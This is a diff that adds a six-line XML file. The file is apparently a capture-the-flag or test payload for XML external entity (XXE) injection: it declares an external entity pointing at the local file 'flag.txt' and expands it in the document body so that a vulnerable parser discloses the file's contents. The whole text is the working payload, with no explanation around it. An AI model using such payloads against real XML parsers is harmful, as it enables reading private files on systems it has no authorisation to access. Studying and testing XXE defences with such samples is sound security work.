@@ -1,0 +1,6 @@
+<!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "flag.txt">
+]>
+<root>
+    &xxe;
+</root>
